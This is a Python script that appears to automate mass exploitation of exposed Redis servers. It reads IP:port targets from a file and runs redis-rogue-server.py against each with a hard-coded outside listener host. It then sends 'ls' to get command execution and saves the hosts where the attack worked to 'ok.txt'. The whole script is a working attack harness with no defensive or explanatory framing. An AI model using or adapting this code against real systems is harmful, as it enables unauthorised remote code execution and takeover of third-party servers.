import random
import subprocess
f = open("vuln.txt", "r")
f2=open("ok.txt","a")

#for line in f.readlines():
for line in f.read().split("\n")[::-1]:
    if line=="":
        continue
    ip, port = line.split(" ")[0].split(":")
    cmd = f"python3 redis-rogue-server.py  --rhost {ip} --rport {port} --lhost 42.193.6.219 --lport {10000+ random.randint(0,10)}"
    res = subprocess.Popen(cmd, shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
    try:
        stdout,stderr = res.communicate(b"ls",timeout=20)
    except:
        res.kill()
        continue
    print(ip)
    if b"Connection refused\n" in stderr:
        pass
    elif b"ERR unknown command \'system.exec"  in stdout or b"ERR unknown command `system.exec`" in stdout:
        pass
    elif len(stdout)==len("BINDING 0.0.0.0:10002\n"):
        pass
    else:
        print(ip,"okokok")
        print(stdout)
        f2.write(line)
    res.kill()
f.close()
f2.close()
